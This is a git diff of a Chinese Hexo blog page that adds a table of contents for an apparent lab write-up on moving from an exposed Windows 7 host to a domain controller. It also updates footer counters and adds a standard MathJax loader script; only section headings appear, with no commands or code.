class="nav-number">4.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BE%BEOA-Getshell"><span class="nav-number">4.2.</span> <span class="nav-text">通达OA Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms17-010%E5%88%A9%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">ms17-010利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%99%A8"><span class="nav-number">5.</span> <span class="nav-text">横向第二台机器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CS%E5%BB%BA%E7%AB%8Bsocks4%E4%BB%A3%E7%90%86"><span class="nav-number">5.0.1.</span> <span class="nav-text">CS建立socks4代理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83getshell"><span class="nav-number">5.1.</span> <span class="nav-text">Redis未授权getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CS%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B0%9D%E8%AF%95%E4%B8%8A%E7%BA%BFwin2016"><span class="nav-number">5.2.</span> <span class="nav-text">CS端口转发尝试上线win2016</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E4%B8%8A%E7%BA%BFwin2016"><span class="nav-number">5.3.</span> <span class="nav-text">msf上线win2016</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%A4%B1%E8%B4%A5%E4%BA%86"><span class="nav-number">5.3.1.</span> <span class="nav-text">反向马上线失败了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%90%91%E9%A9%AC-%E6%88%90%E5%8A%9F%E4%B8%8A%E7%BA%BF"><span class="nav-number">5.3.2.</span> <span class="nav-text">使用正向马 成功上线</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7win2016"><span class="nav-number">6.</span> <span class="nav-text">域控win2016</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-number">6.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2020-1472%EF%BC%88%E7%BD%AE%E7%A9%BA%E5%AF%86%E7%A0%81"><span class="nav-number">6.2.</span> <span class="nav-text">CVE-2020-1472（置空密码)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8impactet"><span class="nav-number">6.3.</span> <span class="nav-text">使用impactet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E5%BC%80%E5%90%AF3389%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-number">6.4.</span> <span class="nav-text">然后开启3389远程桌面</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#references"><span class="nav-number">1.</span> <span class="nav-text">References</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">拓扑图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-2019"><span class="nav-number">3.1.</span> <span class="nav-text">域控 2019</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8-win7"><span class="nav-number">3.2.</span> <span class="nav-text">外网机器 win7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7-2016"><span class="nav-number">3.3.</span> <span class="nav-text">域内用户 2016</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">4.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">4.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BE%BEoa-getshell"><span class="nav-number">4.2.</span> <span class="nav-text">通达OA Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms17-010%E5%88%A9%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">ms17-010利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%99%A8"><span class="nav-number">5.</span> <span class="nav-text">横向第二台机器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#cs%E5%BB%BA%E7%AB%8Bsocks4%E4%BB%A3%E7%90%86"><span class="nav-number">5.0.1.</span> <span class="nav-text">CS建立socks4代理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83getshell"><span class="nav-number">5.1.</span> <span class="nav-text">Redis未授权getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cs%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B0%9D%E8%AF%95%E4%B8%8A%E7%BA%BFwin2016"><span class="nav-number">5.2.</span> <span class="nav-text">CS端口转发尝试上线win2016</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E4%B8%8A%E7%BA%BFwin2016"><span class="nav-number">5.3.</span> <span class="nav-text">msf上线win2016</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%A4%B1%E8%B4%A5%E4%BA%86"><span class="nav-number">5.3.1.</span> <span class="nav-text">反向马上线失败了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%90%91%E9%A9%AC-%E6%88%90%E5%8A%9F%E4%B8%8A%E7%BA%BF"><span class="nav-number">5.3.2.</span> <span class="nav-text">使用正向马 成功上线</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7win2016"><span class="nav-number">6.</span> <span class="nav-text">域控win2016</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-number">6.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cve-2020-1472%E7%BD%AE%E7%A9%BA%E5%AF%86%E7%A0%81"><span class="nav-number">6.2.</span> <span class="nav-text">CVE-2020-1472（置空密码)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8impactet"><span class="nav-number">6.3.</span> <span class="nav-text">使用impactet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E5%BC%80%E5%90%AF3389%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-number">6.4.</span> <span class="nav-text">然后开启3389远程桌面</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -620,7 +686,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -668,7 +734,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -682,7 +748,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -693,7 +759,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -833,6 +899,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
